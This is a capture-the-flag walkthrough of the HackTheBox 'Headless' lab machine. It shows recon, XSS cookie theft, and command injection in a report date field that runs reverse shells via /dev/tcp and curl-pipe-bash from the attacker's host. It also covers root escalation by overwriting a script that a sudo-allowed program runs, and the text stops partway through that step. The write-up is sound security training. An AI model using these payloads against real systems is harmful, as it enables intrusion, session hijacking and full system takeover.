<h1>HackTheBox: Headless</h1>
<r>SPOILER WARNING: This page will contain potential spoilers, so consider that
before continuing</r>

Headless is a super easy machine that introduces the user to basic XSS with
cookies and some simple privilege escalation techniques that can be easily
expanded upon and applied to other boxes.

   MACHINE INFO
┌──────────────────────────┐
│  MACHINE NAME: <a href="https://app.hackthebox.com/machines/Headless">Headless</a>  │
│  IP: 10.10.11.8          │
│  DIFFICULTY: Easy        │
└──────────────────────────┘

An initial nmap of the machine already starts to give us interesting
information about the machine. There is an http server running on port 5000
which sets a cookie to identify the user as an admin or not, since the cookie
seems to be a long randomised string, we probably can't just bruteforce it, but
it's likely something to be exploited.

  <bl>$ nmap -sC -sV 10.10.11.8

Now, we can quickly see if there are any other pages, like perhaps an admin 
dashboard, using a tool like gobuster.

  $ gobuster dir -u 10.10.11.8:5000 -w common.txt

And, there is, however it returns an http 500. Accessed through a browser,
it shows the message:

  <bl>Unauthorized

  The server could not verify that you are authorized to access the URL 
  requested. You either supplied the wrong credentials (e.g. a bad password),
  or your browser doesn't understand how to supply the credentials required.</bl>

Further fuzzing through gobuster finds no other subdomains or directories, and
the support page doesn't seem to do anything. Interestingly, if we take the
cookie we already have and run it through CyberChef to undo a Base64 Encoding
we can see that the first bit of the string decodes to "user", and the rest is
gibberish.

  <bl>From Base64
  Input:
  InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs

  Output:

The site is based on Python, but it's using Werkzeug rather than flask, which
means we can't use flask-unsign to craft a cookie. Instead, we can try some XSS
with burpsuite. I used the one liner I found in <a href="https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e">this article</a>, filled all my 
http fields with it, and got a hit.

  <bl>$ python3 -m http.server 8000
  Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
  10.10.11.8 - - [05/Jun/2024 20:31:40] "GET /?cookie=aXNfYWRtaW49SW1Ga2JXbHVJZ
  y5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1" 200 -</bl>

We'll decode that cookie and pass it back to burpsuite as a cookie.

  <bl>$ echo "aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=" 
  | base64 -d
  
  is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0</bl>

Now, we get a page that offers to generate a website status.

  <bl>Administrator Dashboard

  Generate a website health report:
  Select Date:
  09/15/2023
  Generate Report</bl>

I suspect potential code execution through the date attribute, given the nature
of the other vulnerability, so I try a basic reverse shell one liner, and alas,
nothing.

  <bl>date=2023-09-15;/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.16.12/8000 
  0>&1'</bl>

But, I try again, this time hosting the payload as a file, using python like we
did previously, and I get a hit.

  <bl>...
  Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
  date=2023-09-15;curl http://10.10.16.12:8001/shell.sh|bash

  $ python3 -m http.server 8001
  Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
  10.10.11.8 - - [05/Jun/2024 21:27:13] "GET /shell.sh HTTP/1.1" 200 -

  $ nc -nvlp 1111
  Connection from 10.10.11.8:52230
  bash-5.2$</bl>

From here, we can quickly grab the user flag.

  <bl>$ cd ..
  $ cat user.txt</bl>

Now, we'll list the privileges for our current user using sudo. sudo -l allows
us to list the programs our current user is able to run as a privileged user.
And, surprisingly, we actually get a hit here too.

  <bl>$ whoami
  dvir
  $ sudo -l
  Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

  User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck</bl>

The current user can invoke /usr/bin/syscheck, and we can see what that does
with a quick cat.

  <bl>$ cat /usr/bin/syscheck
  #!/bin/bash

  if [ "$EUID" -ne 0 ]; then
    exit 1
  fi

  last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {}
  + | /usr/bin/sort -n | /usr/bin/tail -n 1)
  formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
  /usr/bin/echo "Last Kernel Modification Time: $formatted_time"

  disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
  /usr/bin/echo "Available disk space: $disk_space"

  load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
  /usr/bin/echo "System load average: $load_average"

  if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
    /usr/bin/echo "Database service is not running. Starting it..."
    ./initdb.sh 2>/dev/null
  else
    /usr/bin/echo "Database service is running."
  fi

  exit 0</bl>

The program is a bash script that calls a bunch of other system utilities as
well as one other script, which we happen to be able to edit. Funnily, when I
read the file out, I found someone else's reverse shell, which is a pretty good
sign that we're on the right track.

  <bl>$ echo "/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.16.12/1112 0>&1'" > initdb.sh
